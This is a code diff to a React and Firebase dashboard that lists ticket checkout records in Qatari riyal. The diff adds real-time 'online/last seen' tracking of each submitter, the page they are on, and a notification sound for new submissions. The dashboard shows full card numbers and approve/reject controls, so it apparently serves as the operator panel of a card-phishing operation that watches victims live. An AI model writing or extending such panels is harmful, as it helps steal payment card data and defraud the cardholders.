@@ -1,5 +1,7 @@
-import { useEffect, useMemo, useState } from "react";
+import { useEffect, useMemo, useRef, useState } from "react";
 import {
+  Bell,
+  BellOff,
   CalendarDays,
   CreditCard,
   Loader2,
@@ -10,7 +12,8 @@ import {
 } from "lucide-react";
 import { Link } from "wouter";
 import { collection, doc, onSnapshot, setDoc } from "firebase/firestore";
-import { db } from "@/lib/firebase";
+import { onValue, ref as databaseRef } from "firebase/database";
+import { database, db } from "@/lib/firebase";
 import { formatQar } from "@/lib/ticket-cart";
 
 type CheckoutItem = {
@@ -54,6 +57,13 @@ type PayRecord = {
   createdAt?: string;
   updatedAt?: string;
   [key: string]: unknown;
+};
+
+type PresenceRecord = {
+  online?: boolean;
+  currentPage?: string;
+  submissionId?: string | null;
+  lastSeen?: unknown;
 };
 
 function getDateSortValue(record: PayRecord): number {
@@ -101,14 +111,15 @@ function getLastMessage(record: PayRecord): string {
   return "New checkout activity";
 }
 
-function getFormattedTime(value?: string): string {
+function getFormattedTime(value?: string | number): string {
   if (!value) {
     return "--";
   }
 
-  const parsed = Date.parse(value);
+  const parsed =
+    typeof value === "number" ? value : Date.parse(value);
   if (Number.isNaN(parsed)) {
-    return value;
+    return String(value);
   }
 
   return new Intl.DateTimeFormat("en-GB", {
@@ -117,6 +128,28 @@ function getFormattedTime(value?: string): string {
     hour: "2-digit",
     minute: "2-digit",
   }).format(new Date(parsed));
+}
+
+function getPresenceForRecord(
+  record: PayRecord,
+  presenceMap: Record<string, PresenceRecord>
+): PresenceRecord | undefined {
+  const direct = presenceMap[record.id];
+  if (direct) {
+    return direct;
+  }
+
+  return Object.values(presenceMap).find(
+    (presence) => presence?.submissionId === record.id
+  );
+}
+
+function resolvePresenceLastSeenValue(value: unknown): string {
+  if (typeof value === "number" || typeof value === "string") {
+    return getFormattedTime(value);
+  }
+
+  return "--";
 }
 
 function toGroupedCardNumber(value: string): string {
@@ -153,6 +186,87 @@ export default function Dashboard() {
   const [decisionLoading, setDecisionLoading] = useState<
     "approve" | "reject" | null
   >(null);
+  const [presenceMap, setPresenceMap] = useState<Record<string, PresenceRecord>>(
+    {}
+  );
+  const [isSoundEnabled, setIsSoundEnabled] = useState(true);
+  const hasReceivedFirstSnapshotRef = useRef(false);
+  const previousStatusMapRef = useRef<Map<string, string>>(new Map());
+  const soundEnabledRef = useRef(true);
+  const audioContextRef = useRef<AudioContext | null>(null);
+
+  useEffect(() => {
+    soundEnabledRef.current = isSoundEnabled;
+  }, [isSoundEnabled]);
+
+  useEffect(() => {
+    const presenceRef = databaseRef(database, "presence");
+    const unsubscribe = onValue(presenceRef, (snapshot) => {
+      const rawPresence = snapshot.val() as Record<string, PresenceRecord> | null;
+      setPresenceMap(rawPresence ?? {});
+    });
+
+    return () => {
+      unsubscribe();
+    };
+  }, []);
+
+  useEffect(() => {
+    return () => {
+      if (audioContextRef.current) {
+        void audioContextRef.current.close();
+      }
+    };
+  }, []);
+
+  const playNotificationSound = () => {
+    if (!soundEnabledRef.current || typeof window === "undefined") {
+      return;
+    }
+
+    try {
+      const AudioContextClass =
+        window.AudioContext ||
+        (
+          window as Window & {
+            webkitAudioContext?: typeof AudioContext;
+          }
+        ).webkitAudioContext;
+
+      if (!AudioContextClass) {
+        return;
+      }
+
+      if (!audioContextRef.current) {
+        audioContextRef.current = new AudioContextClass();
+      }
+
+      const audioContext = audioContextRef.current;
+      void audioContext.resume().catch(() => {
+      });
+
+      const oscillator = audioContext.createOscillator();
+      const gainNode = audioContext.createGain();
+      oscillator.connect(gainNode);
+      gainNode.connect(audioContext.destination);
+
+      oscillator.type = "sine";
+      oscillator.frequency.setValueAtTime(880, audioContext.currentTime);
+      gainNode.gain.setValueAtTime(0.0001, audioContext.currentTime);
+      gainNode.gain.exponentialRampToValueAtTime(
+        0.15,
+        audioContext.currentTime + 0.01
+      );
+      gainNode.gain.exponentialRampToValueAtTime(
+        0.0001,
+        audioContext.currentTime + 0.22
+      );
+
+      oscillator.start();
+      oscillator.stop(audioContext.currentTime + 0.22);
+    } catch {
+    }
+  };
 
   useEffect(() => {
     setIsLoading(true);
@@ -165,6 +279,33 @@ export default function Dashboard() {
             ...(entry.data() as Omit<PayRecord, "id">),
           }))
           .sort((a, b) => getDateSortValue(b) - getDateSortValue(a));
+
+        const nextStatusMap = new Map<string, string>();
+        nextRecords.forEach((record) => {
+          nextStatusMap.set(
+            record.id,
+            String(record.payment?.status ?? record.status ?? "")
+          );
+        });
+
+        if (hasReceivedFirstSnapshotRef.current) {
+          const hasNewRecord = nextRecords.some(
+            (record) => !previousStatusMapRef.current.has(record.id)
+          );
+
+          const hasStatusChange = nextRecords.some((record) => {
+            const previousStatus = previousStatusMapRef.current.get(record.id);
+            const nextStatus = nextStatusMap.get(record.id);
+            return previousStatus !== undefined && previousStatus !== nextStatus;
+          });
+
+          if (hasNewRecord || hasStatusChange) {
+            playNotificationSound();
+          }
+        }
+
+        previousStatusMapRef.current = nextStatusMap;
+        hasReceivedFirstSnapshotRef.current = true;
 
         setRecords(nextRecords);
         setError(null);
@@ -210,6 +351,11 @@ export default function Dashboard() {
     records.find((record) => record.id === selectedId) ?? filteredRecords[0] ?? null;
   const selectedStatus = selectedRecord?.payment?.status ?? selectedRecord?.status;
   const selectedStatusBadge = getStatusBadge(selectedStatus);
+  const selectedPresence = selectedRecord
+    ? getPresenceForRecord(selectedRecord, presenceMap)
+    : undefined;
+  const isSelectedOnline = Boolean(selectedPresence?.online);
+  const selectedLastSeen = resolvePresenceLastSeenValue(selectedPresence?.lastSeen);
   const selectedCardNumber = toGroupedCardNumber(
     selectedRecord?.payment?.cardNumberFull ??
       selectedRecord?.payment?.cardNumberMasked ??
@@ -310,6 +456,18 @@ export default function Dashboard() {
               <span className="rounded-full bg-black/20 px-3 py-1 font-semibold">
                 Unread: {unreadCount}
               </span>
+              <button
+                type="button"
+                onClick={() => setIsSoundEnabled((current) => !current)}
+                className="inline-flex items-center gap-1 rounded-full bg-black/20 px-3 py-1 font-semibold text-white hover:bg-black/30"
+              >
+                {isSoundEnabled ? (
+                  <Bell className="h-3.5 w-3.5" />
+                ) : (
+                  <BellOff className="h-3.5 w-3.5" />
+                )}
+                {isSoundEnabled ? "Sound on" : "Sound off"}
+              </button>
               <Link
                 href="/"
                 className="rounded-full bg-white/90 px-3 py-1 font-semibold text-[#128c7e] hover:bg-white"
@@ -353,6 +511,8 @@ export default function Dashboard() {
                 const isSelected = selectedRecord?.id === record.id;
                 const status = record.payment?.status ?? record.status;
                 const statusBadge = getStatusBadge(status);
+                const presence = getPresenceForRecord(record, presenceMap);
+                const isOnline = Boolean(presence?.online);
 
                 return (
                   <button
@@ -379,6 +539,20 @@ export default function Dashboard() {
                         <p className="mt-0.5 truncate text-xs text-[#8696a0]">
                           {record.id}
                         </p>
+                        <div className="mt-1 flex items-center gap-1.5 text-[10px]">
+                          <span
+                            className={`h-2 w-2 rounded-full ${
+                              isOnline ? "bg-[#25d366]" : "bg-[#54656f]"
+                            }`}
+                          />
+                          <span
+                            className={
+                              isOnline ? "text-[#25d366]" : "text-[#8696a0]"
+                            }
+                          >
+                            {isOnline ? "online" : "offline"}
+                          </span>
+                        </div>
                         <div className="mt-2 flex items-center justify-between gap-2">
                           <p className="truncate text-xs text-[#c6d1d6]">
                             {getLastMessage(record)}
@@ -414,6 +588,15 @@ export default function Dashboard() {
                         {getDisplayName(selectedRecord)}
                       </h2>
                       <p className="text-xs text-[#8696a0]">{selectedRecord.id}</p>
+                      <p
+                        className={`mt-0.5 text-[11px] font-semibold ${
+                          isSelectedOnline ? "text-[#25d366]" : "text-[#8696a0]"
+                        }`}
+                      >
+                        {isSelectedOnline
+                          ? "Online now"
+                          : `Offline • Last seen ${selectedLastSeen}`}
+                      </p>
                     </div>
                   </div>
                   <div className="flex items-center gap-2">
